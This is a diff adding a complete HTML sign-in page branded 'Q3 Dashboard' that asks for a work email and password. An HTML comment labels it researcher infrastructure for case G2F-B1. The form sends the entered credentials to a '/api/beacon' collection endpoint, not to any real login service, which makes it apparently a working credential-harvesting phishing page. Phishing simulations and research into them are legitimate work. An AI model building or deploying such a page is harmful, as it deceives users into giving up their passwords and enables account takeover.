@@ -1,0 +1,16 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Q3 Dashboard — Sign in</title>
+<style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f6f8;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);padding:40px;width:360px}
+h1{font-size:22px;margin:0 0 6px;color:#1c2b33}.sub{color:#5a6a75;font-size:14px;margin:0 0 24px}
+label{display:block;font-size:13px;color:#33454f;margin:14px 0 4px;font-weight:500}
+input{width:100%;box-sizing:border-box;padding:10px;border:1px solid #cfd7dd;border-radius:8px;font-size:14px}
+button{width:100%;margin-top:22px;padding:11px;background:#0668E1;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+.foot{margin-top:18px;font-size:12px;color:#8195a0;text-align:center}</style></head>
+<body><div class="card"><h1>Q3 Dashboard</h1><p class="sub">Sign in to your team workspace.</p>
+<!-- researcher infra (case G2F-B1): own Vercel app login form; action = own same-origin relay -->
+<form action="/api/beacon?case=G2F-B1" method="post">
+  <label>Email</label><input type="email" name="email" autocomplete="username" placeholder="you@company.com" required>
+  <label>Password</label><input type="password" name="password" autocomplete="current-password" placeholder="Enter your password" required>
+  <button type="submit">Sign in</button>
+</form>
+<p class="foot">© 2026 Q3 Dashboard · Privacy · Terms</p></div></body></html>
